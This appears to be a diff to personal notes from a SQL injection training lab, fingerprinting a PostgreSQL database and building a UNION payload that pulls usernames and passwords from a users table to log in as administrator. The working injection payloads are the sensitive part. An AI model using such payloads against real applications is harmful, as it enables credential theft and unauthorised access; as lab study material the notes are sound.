@@ -27,8 +27,12 @@ etc.
 ' UNION SELECT NULL,version()--   PostgreSQL
 ```
 - the second payload works and its a postgresql db
-- postgresql has 2 differnet ways of concatenation
+- postgresql ways of concatenation
 ```
 'foo'||'bar'
-'foo' 'bar'
 ```
+- so final payload built from lab description and postgresql conctatination
+```
+' UNION select NULL, username || '*' || password from users--
+```
+- we got the username and password creds we login with administartor and we solved the lab
